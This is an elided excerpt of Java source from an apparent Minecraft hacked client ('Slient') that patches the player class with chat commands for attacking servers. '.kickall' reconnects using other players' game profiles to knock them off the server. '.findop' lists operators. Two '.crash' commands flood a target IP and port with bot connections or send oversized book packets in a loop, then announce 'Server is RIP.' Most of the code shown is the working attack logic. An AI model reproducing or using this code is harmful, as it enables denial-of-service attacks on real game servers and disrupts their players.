...
import slientclient.utils.wutils;
...
public class EntityPlayerSP extends AbstractClientPlayer
{
    ...
    {
    	if(Slient.onSendChatMessage(message)){
        ...
        if (message.startsWith(".kickall"))
        {
          ...
          new Thread()
          {
            public void run()
            {
              try
              {
                String[] s = messageFinal.split(" ");
                int port = Integer.parseInt(s[2]);
                NetHandlerPlayClient connection = EntityPlayerSP.this.connection;
                List<NetworkPlayerInfo> players = GuiPlayerTabOverlay.ENTRY_ORDERING
                  .sortedCopy(connection.getPlayerInfoMap());
                for (NetworkPlayerInfo n : players) {
                  if (!n.getGameProfile().getId().toString().equals(EntityPlayerSP.this.getUniqueID().toString()))
                  {
                    Random rand = new Random();InetAddress var1 = null;var1 = InetAddress.getByName(s[1]);
                    GuiConnecting.networkManager = NetworkManager.createNetworkManagerAndConnect(var1, 
                      port, Minecraft.getMinecraft().gameSettings.isUsingNativeTransport());
                    GuiConnecting.networkManager
                      .setNetHandler(new NetHandlerLoginClient(GuiConnecting.networkManager, 
                    ...
                    GuiConnecting.networkManager.sendPacket(new CPacketLoginStart(n.getGameProfile()));
                    Thread.sleep(0L);
                  }
                }
        		NotificationManager.show(new Notification(NotificationType.WARNING, "Kickall", "Server is RIP.", 2));
                Slient.addChatMessage("§eKickAll.");
              }
              catch (Exception ex)
              {
				Slient.addChatMessage("§4Invalid Command Usage!");
                Slient.addChatMessage("§3.kickall §b[IP] [Port]");
              }
            }
          }.start();
        }
        
        if (message.startsWith(".findop"))
        {
          final String messageFinal = message;
          new Thread()
          {
            public void run()
            {
              ...
              Slient.addChatMessage("");
              Slient.addChatMessage("");
              Slient.addChatMessage("§bOp players list ( Gamemode 1 ) ");
              Slient.addChatMessage("");
              try
              {
          	  NetHandlerPlayClient connection = EntityPlayerSP.this.connection;
                ...
                for (NetworkPlayerInfo n : players) {
                  ...
                  {
        			  Slient.addChatMessage("§d" + n.getGameProfile().getName());
                  }
                }
                Slient.addChatMessage("");
              }
        ...
        if (message.equalsIgnoreCase(".crash")) {
            new Thread()
            {
              public void run()
              {
                try
                {
                  Slient.addChatMessage("§eCrashing server...");
                  ...
                  EntityPlayerSP.book.setTagInfo("pages", list);
                  EntityPlayerSP.book.setTagCompound(tag);
                  for (;;)
                  {
         //           wutils.sendPacket(new CPacketConfirmTeleport(new BlockPos(wutils.player().posX, wutils.player().posY - 2.0D, wutils.player().posZ), 1, EntityPlayerSP.book, 0.0F, 0.0F, 0.0F));
                    Thread.sleep(10L);
                  }
                }
                catch (Exception e)
          ...
          new Thread()
          {
            public void run()
            {
              try
              {
                String[] s = messageFinal.split(" ");
                int port = Integer.parseInt(s[2]);
                Slient.addChatMessage("§5Crash started!");
                for (int count = 0; count < Minecraft.getMinecraft().botCount; count++)
                {
                  Random rand = new Random();InetAddress var1 = null;var1 = InetAddress.getByName(s[1]);
                  GuiConnecting.networkManager = NetworkManager.createNetworkManagerAndConnect(var1, 
                    port, Minecraft.getMinecraft().gameSettings.isUsingNativeTransport());
        		...
        		NotificationManager.show(new Notification(NotificationType.WARNING, "Crash2", "Server is RIP.", 2));
                Slient.addChatMessage("§dCrash ended!");
              }
              catch (Exception ex)
              {
				  Slient.addChatMessage("§4Invalid Command Usage!");
            	  Slient.addChatMessage("§6.crash §e[IP] [Port]");
              }
            }
          }.start();
        }
			 ...
			 // Slient.addChatMessage(n.getGameProfile().getName());    
	...
	public void move(MoverType player, int i, int j, int k) {
